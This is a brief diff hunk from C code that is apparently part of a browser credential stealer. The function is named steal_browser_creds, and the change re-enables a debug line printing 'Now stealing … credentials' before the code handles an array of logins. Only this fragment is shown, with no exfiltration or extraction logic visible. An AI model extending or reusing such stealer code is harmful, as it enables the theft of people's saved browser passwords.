@@ -205,7 +205,7 @@ static int steal_browser_creds(BrowserInfo browser) {
     return EXIT_FAILURE;
   }
 
-  // wprintf(L"=== Now stealing %ls credentials ===\n", browser.browserName);
+  wprintf(L"=== Now stealing %ls credentials ===\n", browser.browserName);
 
   Login *logins = NULL;
   int loginsCount = 0;
